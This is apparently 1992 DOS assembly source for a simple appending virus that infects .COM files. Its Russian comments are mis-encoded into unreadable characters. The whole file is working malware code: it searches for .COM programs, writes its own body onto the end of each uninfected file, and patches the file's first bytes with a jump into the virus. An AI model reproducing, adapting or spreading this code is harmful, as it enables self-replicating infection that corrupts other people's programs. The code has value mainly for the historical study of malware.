

; Œ «¥­ìª¨© (¨«¨ ¡®«ìè®©) ¢¨àãá, § à ¦ îé¨© .COM-¯à®£à ¬¬ë
;   ¯à¨ § ¯ãáª¥, ¥á«¨ ã ­¨å ­¥âã ¢­ ç «¥ JMP.
; à®¢¥àª¨ ­  ¢áïª¨¥ ¢áïç­®áâ¨ ­¥ ¯à¨áãâáâ¢ãîâ.
;
; Copyright (c) 1992, Gogi&Givi International.
;

.model	tiny
.code
	org	0100h
start:
	jmp	virusstart			; ¥à¥å®¤ ­  ¢¨àãá:
	mov	ah,09h				;   â ª¦¥, ª ª ¡ã¤¥â
	int	21h				;   á ¦¥àâ¢®© ¯à¨
	mov	ax,4C00h			;   § à ¦¥­¨¨
	int	21h
	Message	db 'This is little infection... He-he...',13,10,'$'
						; „® á¨å ¯®à ­®à¬ «ì­ë©
						;   ª®¤ ¦¥àâ¢ë

virusstart:					; € íâ® ¢¨àãá
        pushf
	push	ax				; ‘®åà ­ï¥¬ ¢á¥, çâ®
	push	bx				;   â®«ìª® ¬®¦­®...
	push	cx
	push	dx
	push	ds				; ¥ §­ î, ­ áª®«ìª®
	push	es				;   íâ® ¯à ¢¨«ì­®...
	push	si
	call	SelfPoint
SelfPoint:                                      ; Ž¯à¥¤¥«ï¥¬ â®çªã
        pop     si                              ;   ¢å®¤ 

        cld                                     ; „¢¨¦¥¬áï ¢¯à ¢®
        push    cs                              ; ®áâ ¢¨¬ á¥£¬¥­â­ë¥
        pop     ds                              ;   à¥£¨áâàë ­ §­ ç¥­¨ï
        push    cs                              ;   ¨ ®â¯à ¢«¥­¨ï
	pop	es
	mov	di,0100h			; ‚ ¯à¨¥¬­¨ª¥ - 0100h,
	push	si				;   ­ ç «® ¯à®£à ¬¬ë
	add	si,original-SelfPoint		; ‘¥©ç á SI ãª §ë¢ ¥â ­ 
	mov	cx,3				;   ®à¨£¨­ «ì­ë¥ ¡ ©âë
	rep	movsb				; ‘ª®¯¨àã¥¬ ¨å ¢ ­ ç «®
	pop	si				;   § à ¦¥­­®© ¯à®£à ¬¬ë

	mov	ah,1Ah				; ®áâ ¢¨¬ á®¡áâ¢¥­­ãî
	mov	dx,si				;   DTA ¨§ ª®­æ  ¢¨àãá 
	add	dx,VirusDTA-SelfPoint		;   21h ¯à¥àë¢ ­¨¥¬
	int	21h

	mov	ah,4Eh				; „¥« ¥¬ FindFirst
	mov	dx,si				;   á á®®â¢¥âáâ¢ãîé¥©
	add	dx,FileMask-SelfPoint		;   ¬ áª®©
	mov	cx,32				;   ¨  âà¨¡ãâ®¬ çâ¥­¨¥/
	int	21h				;   § ¯¨áì, çâ®¡ë ­¥
						;   ¬ã¤à¨âì
	jnc	RepeatOpen			; Žè¨¡®ª ­¥â - ®âªàë¢ ¥¬

	jmp	OutVirus			; ¨§ª® ¯®è¥«...

RepeatOpen:
        mov     ax,3D02h                        ; Žâªà®¥¬ ä ©«
        mov     dx,si                           ;   ¯à¨ ¯®¬®é¨ à áè¨à¥­­®£®
        add	dx,NameF-SelfPoint		;   ã¯à ¢«¥­¨ï ®­ë¬
	int	21h
	jc	OutVirus			; à¨ ¢á¥å ®è¨¡ª å ¢ëå®¤¨¬

        mov     bx,ax                           ; ‚®§ì¬¥¬ ­®¬¥à ä ©« ,
						;   ¨ ¡ã¤¥¬ ¤¥à¦ âìáï §  BX

	mov	ah,3Fh				; ‘ç¨âë¢ ¥¬ ­ áâ®ïé¨¥
	mov	dx,si				;   ª®¬ ­¤ë ¤«ï
	add	dx,Original-SelfPoint		;   ¨á¯®«­¥­¨ï
	mov	cx,3				; ãáâì ¡ã¤¥â âà¨ ¡ ©â 
	int	21h
        jc      OutVirus			; Ž¯ïâì ¯à®¢¥à¨¬ ­  ®è¨¡ªã...
	push	bx
	mov	bx,dx
	cmp	byte ptr [bx],'é'		; ‚¤àã£ ¢ íâ®¬ ä ©«¥
	pop	bx				;   â®¦¥ á­ ç «  ¯¥à¥å®¤?
						; 
	je	CloseNotInfect			; ’®£¤  ­¥ § à ¦ âì!
						; Žå, «¥­ì ¬­¥ ¯®â®ç­¥¥
						;   ¯à®¢¥àïâì...

	mov	ax,4202h			; àë£ ¥¬ ¢ ª®­¥æ
	xor	cx,cx				;   ¦¥àâ¢ë (¨§­ á¨«®¢ ­¨ï)
	xor	dx,dx
	int	21h				; ’¥¯¥àì ¢ AX «¥¦¨â
        jc      OutVirus                        ;    ¤à¥á ­ ç « 
						;   ¢¨àãá , ¥á«¨ ­¥â,
						;   ª®­¥ç­®, ®è¨¡ª¨
	push	ax

	mov	ah,40h				; ‡ ¯¨è¥¬
	mov	dx,si				;   â¥«® ¢¨àãá 
	sub	dx,SelfPoint-VirusStart		;   ¢ ä ©«-¦¥àâ¢ã
	mov	cx,VirusEnd-VirusStart		; Š®«¨ç¥áâ¢® ¡ ©â
	int	21h

	pop	ax
        jc      OutVirus			; Œ®¦¥â á«ãç¨âìáï ®è¨¡ª  - 
						;   ¤¨áª, â ¬, ¯¥à¥¯®«­¥­...

        sub     ax,3                            ; ‚ëç¨â ¥¬ 3 - çâ®¡ë
        push    bx                              ;   ¯®¯ áâì Šã¤   ¤®
	mov	bx,si
	sub	bx,SelfPoint-VirusStart
	mov	word ptr cs:[bx+1],ax		; Š« ¤¥¬  ¤à¥á
	mov	byte ptr [bx],'é'		; Š®¬ ­¤  ¯¥à¥å®¤  (¢
						;   ¯à¥¤¥« å á¥£¬¥­â )
	pop	bx

	mov	ax,4200h			; € â¥¯¥àì ¢ ­ ç «®
	xor	cx,cx				;   ¦¥àâ¢ë
	xor	dx,dx
	int	21h
        jc      OutVirus			; à®¢¥àª  ­  ®è¨¡ªã

	mov	ah,40h				; ˆ § ¯¨è¥¬ âã¤ 
	mov	dx,si				;   ª®¬ ­¤ã ¯¥à¥å®¤ 
	sub	dx,SelfPoint-VirusStart		;   ­  ­ è¥ £­ãá­®¥
	mov	cx,3				;   â¥«®
	int	21h
        jc      OutVirus			; Ž¯ïâì ¯à®¢¥à¨¬ ®è¨¡ª¨

	mov	ah,3Eh				; ” ©« ­ ¤® § ªàëâì
	int	21h				;   (Ž­ ã¦¥ § à ¦¥­ -
	jmp	OutVirus			;   ¡®«ìè¥ ­¥ à ¡®â ¥¬)

CloseNotInfect:
	mov	ah,3Eh				; ‡ ªàë¢ ¥¬ ­¥¯®¤å®¤ïé¨©
	int	21h				;   ä ©«
	
	mov	dx,si
	add	dx,FileMask-SelfPoint		; ˆ ¤¥« ¥¬ FindNext
	mov	ah,4Fh
	int	21h
	jc	OutVirus			; Žè¨¡ª  - §­ ç¨â, ­¥ áã¤ì¡ 
	jmp	RepeatOpen			; ˆ«¨ ¯¥à¥å®¤ ­  ®âªàëâ¨¥

OutVirus:
	pop	si				; ˆ, ª®­¥ç­® ¦¥,
	pop	es				;   ¢á¥ ­  á¢¥â¥
	pop	ds				;   ¢®ááâ ­®¢¨âì
	pop	dx
	pop	cx
	pop	bx
	pop	ax
        popf
	mov	si,0100h			; ‡ ­®á¨¬ ¢ áâ¥ª  ¤à¥á
	push	si				;   ­ ç «  ¯à®£à ¬¬ë
	ret					;   ¨ ¤¥« ¥¬ RET

						;  è¨ ¤ ­­ë¥:

VirusDTA	db 30 dup (0)			; â® DTA
NameF		db 13 dup (0)			; ’ãâ ¡ã¤¥â ¨¬ï ä ©« 
FileMask	db '*.cOm',(0)			; ‚®â â ª ï ªà á¨¢ ï
						;   ¬ áª 
original:
	mov	dx,offset Message		; € íâ® ®à¨£¨­ «ì­ë¥ ¡ ©âë
VirusEnd:					;   ¨§ ¦¥àâ¢ë (‹®§¨­áª¨©,
						;   ­¥ §¥¢ ©!)
	end	start

